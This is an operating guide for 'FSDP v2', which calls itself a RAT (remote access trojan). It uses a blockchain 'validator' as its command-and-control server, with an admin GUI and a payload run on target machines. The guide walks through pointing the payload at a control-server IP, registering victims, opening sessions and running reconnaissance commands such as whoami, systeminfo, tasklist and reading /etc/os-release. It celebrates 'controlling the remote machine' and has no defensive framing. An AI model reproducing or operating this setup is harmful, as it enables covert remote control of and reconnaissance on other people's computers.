# FSDP v2 - Complete System Guide

## 🎉 Everything You Need!

This guide shows you how to use the complete FSDP v2 system with all components working together.

---

## 📦 What's Included

1. **blockchain_validator.py** - The blockchain validator (runs on your server)
2. **admin_gui_v2.py** - The admin GUI (runs on your admin machine)
3. **payload_v2.py** - The payload (runs on target machines)

All three components share the same blockchain!

---

## 🚀 Step-by-Step Setup

### Step 1: Start the Validator

On your **admin/server machine**:

```cmd
cd C:\Users\Administrator\Documents\GitHub\rat_full_sessions
python blockchain_validator.py
```

**You'll see:**
```
======================================================================
FSDP BLOCKCHAIN VALIDATOR NODE
======================================================================
✓ Blockchain initialized
✓ Validator node started
✓ Node ID: validator-001
✓ Local IP: 38.89.139.10

======================================================================
CONFIGURATION FOR PAYLOADS:
======================================================================
  Blockchain Node Address: 38.89.139.10:5000
  Alternative (localhost): localhost:5000
======================================================================
```

**IMPORTANT:** Note the IP address! You'll need it.

**Keep this terminal open!**

---

### Step 2: Start the Admin GUI

Open a **NEW terminal/command prompt** on the same machine:

```cmd
cd C:\Users\Administrator\Documents\GitHub\rat_full_sessions
python admin_gui_v2.py
```

**A popup will ask:** "Enter validator address"

**Type:** `localhost:5000` (since validator is on same machine)

**Click OK**

**The GUI will open!** 🎨

---

### Step 3: Configure and Run Payload on Target

On your **target machine**:

1. **Edit payload_v2.py** first:
   ```cmd
   notepad payload_v2.py
   ```

2. **Find this line** (near the top):
   ```python
   BLOCKCHAIN_NODE = "localhost:5000"
   ```

3. **Change it to your validator IP:**
   ```python
   BLOCKCHAIN_NODE = "38.89.139.10:5000"  # Use your validator IP from Step 1
   ```
   
   **OR** if target is on the same machine as validator, leave it as `localhost:5000`

4. **Save the file**

5. **Run the payload:**
   ```cmd
   cd C:\Users\Administrator\Documents\GitHub\rat_full_sessions
   python payload_v2.py
   ```

**You'll see:**
```
======================================================================
FSDP PAYLOAD V2
======================================================================
Payload ID: 5374ebd3-fbaa-49b6-8383-4d1d9aae8782
Hostname: gil-w25
Platform: Windows/AMD64
IP Address: 45.61.59.125
Debug Mode: True
Connecting to blockchain node: 38.89.139.10:5000
Registration sent to blockchain
Heartbeat sent
Payload started successfully
```

**Keep this running!**

---

## 🎯 Using the Admin GUI

### Dashboard Tab

**What you'll see:**
- **Connected Targets:** Number of payloads connected
- **Active Sessions:** Number of open sessions
- **Blockchain Blocks:** Total blocks in chain
- **Transactions:** Total transactions
- **Activity Log:** Real-time log of all actions

**Click "Refresh"** to update stats

---

### Targets Tab

**Step 1:** Click the **"Targets"** tab

**Step 2:** Click **"🔄 Refresh"** button

**You should see your target:**
```
Target ID: 5374ebd3-fbaa-49b6-8383-4d1d9aae8782
Hostname: gil-w25
IP: 45.61.59.125
Platform: Windows
Status: Online
Last Seen: 23:30:15
```

**Step 3:** Click on the target row to select it

**Step 4:** Click **"📡 Open Session"** button

**A popup will say:** "Session opened!"

**The GUI automatically switches to Terminal tab**

---

### Terminal Tab

**You're now in the Terminal tab!**

**Step 1:** Click **"➕ Create Terminal"** button

**You'll see:**
```
╔═══════════════════════════════════════════════════════════╗
║  FSDP Terminal - terminal-1729300000...  ║
╚═══════════════════════════════════════════════════════════╝

Working directory: C:\Users\Administrator
Ready to execute commands.

$
```

**Step 2:** Type a command in the box at the bottom:
```
whoami
```

**Step 3:** Press **Enter** or click **"▶️ Execute"**

**You'll see the output in the terminal!**

---

### Example Commands to Try

```cmd
# Windows Commands
whoami
hostname
dir
cd C:\
dir
ipconfig
systeminfo
echo Hello from FSDP!
ver
set
tasklist
netstat -an

# If target is Linux
whoami
hostname
ls -la
pwd
cd /tmp
ls
uname -a
ps aux
ifconfig
cat /etc/os-release
```

---

### Sessions Tab

**View all active sessions:**
- Session ID
- Target ID
- Status (Active/Disconnected)
- Number of terminals
- Creation time

**To close a session:**
1. Select the session
2. Click **"❌ Close Session"**

---

### Blockchain Tab

**See the blockchain in action!**

**Click "🔄 Refresh"** to see:
- Chain length
- Pending transactions
- Chain validity
- Recent blocks with all transactions

**You can see:**
- Registration transactions
- Heartbeat transactions
- Session open/close
- Terminal commands
- Command outputs

---

## 🎮 Complete Workflow Example

### Scenario: Execute commands on a remote Windows machine

**Terminal 1 (Validator):**
```cmd
python blockchain_validator.py
# Keep running, note IP: 38.89.139.10:5000
```

**Terminal 2 (Admin GUI):**
```cmd
python admin_gui_v2.py
# Enter: localhost:5000
# GUI opens
```

**Target Machine:**
```cmd
# Edit payload_v2.py, set BLOCKCHAIN_NODE = "38.89.139.10:5000"
python payload_v2.py
# Keep running
```

**In Admin GUI:**
1. **Targets tab** → Click "Refresh" → See target
2. Select target → Click "Open Session"
3. **Terminal tab** → Click "Create Terminal"
4. Type: `whoami` → Press Enter
5. See output: `gil-w25\Administrator`
6. Type: `dir` → Press Enter
7. See directory listing
8. Type: `ipconfig` → Press Enter
9. See network configuration

**Done!** You're controlling the remote machine! 🎉

---

## 🔧 Troubleshooting

### "No targets showing up"

**Check:**
1. ✅ Validator is running
2. ✅ Payload is running on target
3. ✅ Payload has correct validator IP
4. ✅ Firewall allows port 5000
5. ✅ Wait 30 seconds for heartbeat
6. ✅ Click "Refresh" in Targets tab

**Solution:**
- Check payload logs: `type %USERPROFILE%\.fsdp_logs\*.log`
- Check validator terminal for errors
- Make sure all three components are running

---

### "Commands not executing"

**Check:**
1. ✅ Session is open
2. ✅ Terminal is created
3. ✅ Session label is green (not red)
4. ✅ Terminal label is green (not red)

**Solution:**
- Close and reopen session
- Create a new terminal
- Check activity log for errors

---

### "Validator connection failed"

**Check:**
1. ✅ Validator is running
2. ✅ Correct IP address in admin GUI
3. ✅ Correct IP address in payload_v2.py

**Solution:**
- Restart validator
- Restart admin GUI with correct IP
- Edit payload_v2.py with correct IP

---

## 📊 System Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                     FSDP v2 System                          │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────────┐         ┌──────────────┐         ┌──────┐│
│  │  Admin GUI   │◄────────┤  Blockchain  ├────────►│Payload││
│  │  (Python +   │         │  Validator   │         │ (Py) ││
│  │   Tkinter)   │         │  (PoA Node)  │         │      ││
│  └──────────────┘         └──────────────┘         └──────┘│
│         │                        │                     │    │
│         │                        │                     │    │
│    Dashboard              Shared Blockchain      Terminals  │
│    Targets                  (Real-time)          Commands   │
│    Terminal                                      Execution  │
│    Sessions                                                 │
│    Blockchain View                                          │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## 🎨 GUI Features

### Color Scheme
- **Blue** - Targets stat card
- **Red** - Sessions stat card
- **Purple** - Blockchain stat card
- **Orange** - Transactions stat card
- **Green** - Active/Online status
- **Red** - Inactive/Offline status
- **Black terminal** - Green text (Matrix style!)

### Keyboard Shortcuts
- **Enter** in command box - Execute command
- **ESC** - Close dialogs
- **Ctrl+C** in terminal - Copy text

### Auto-Refresh
- Targets discovered automatically every 5 seconds
- Dashboard stats update on refresh
- Blockchain syncs in real-time

---

## 📝 Important Notes

### Security
- **Debug mode** logs everything - disable for production
- **Firewall** - Allow port 5000 for blockchain
- **Network** - Validator must be reachable by payloads

### Performance
- **Heartbeat** - Every 30 seconds
- **Command timeout** - 60 seconds
- **Auto-discovery** - Every 5 seconds

### Limitations
- Commands execute locally (for demo)
- In production, commands would go through blockchain
- File transfer not yet implemented in GUI

---

## 🚀 Next Steps

1. **Test on multiple targets** - Run payload on different machines
2. **Try different commands** - Explore what you can do
3. **Monitor blockchain** - Watch transactions in Blockchain tab
4. **Create multiple terminals** - Run parallel commands
5. **Experiment with sessions** - Open/close sessions

---

## ✅ Checklist

Before you start:
- [ ] Validator running
- [ ] Admin GUI running
- [ ] Payload configured with correct IP
- [ ] Payload running on target
- [ ] All three in same network (or firewall configured)

During operation:
- [ ] Target appears in Targets tab
- [ ] Session opened successfully
- [ ] Terminal created
- [ ] Commands executing
- [ ] Output visible in terminal

---

## 🎉 You're Ready!

**You now have a complete RAT system with:**
- ✅ Blockchain-based communication
- ✅ Beautiful Python GUI
- ✅ Multiple isolated terminals
- ✅ Session persistence
- ✅ Real-time monitoring
- ✅ Cross-platform support

**Enjoy your FSDP v2 system!** 🚀

---

**Need help?** Check the activity log in the Dashboard tab for errors!

